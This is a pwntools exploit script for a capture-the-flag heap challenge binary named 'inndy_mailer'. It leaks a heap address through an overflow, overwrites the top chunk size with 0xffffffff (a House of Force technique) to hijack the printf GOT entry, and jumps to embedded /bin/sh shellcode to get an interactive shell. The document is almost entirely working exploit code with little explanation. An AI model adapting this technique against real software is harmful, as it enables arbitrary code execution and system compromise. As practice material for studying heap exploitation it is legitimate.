from pwn import *

p = process('./data/bin/heap23_41_inndy_mailer')
elf = ELF('./data/bin/heap23_41_inndy_mailer')
libc = elf.libc

context(arch='i386', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
menu = b'Action: '

def add(size, title, msg):
    p.sendlineafter(menu, b'1')
    p.sendlineafter(b'Content Length: ', str(size).encode())
    p.sendlineafter(b'Title: ', title)
    p.sendlineafter(b'Content: ', msg)

def show():
    p.sendlineafter(menu, b'2')

shellcode = asm(shellcraft.sh()).ljust(0x40, b'\x00') +p32(0x20)
add(8, shellcode, b'B'*0x8)
add(8, b'A'*0x40+p32(0x20), b'A'*0x8 + p32(0) + p32(0xffffffff))   #通过溢出覆盖长度到下一块的ptr 输出堆地址
show()
p.recvuntil(b'B'*8)
p.recv(8)
heap_addr = u32(p.recv(4)) - 8
top_chunk = heap_addr + 0xb8
print('heap:', hex(heap_addr))
print('top:', hex(top_chunk))

off_got   = elf.got['printf'] - top_chunk
add(off_got -0x50, b'AAAA', b'BBBB') # 0x804a000:top_chunk.pre_size 0x804a00c:got.printf
 
#gdb.attach(p, 'b*0x80486e9')
 
p.sendlineafter(menu, b'1')
p.sendlineafter(b'Content Length: ', str(0x1).encode())
p.sendlineafter(b'Title: ', p32(heap_addr + 0xc))  #got.printf-> shellcode
 
p.interactive()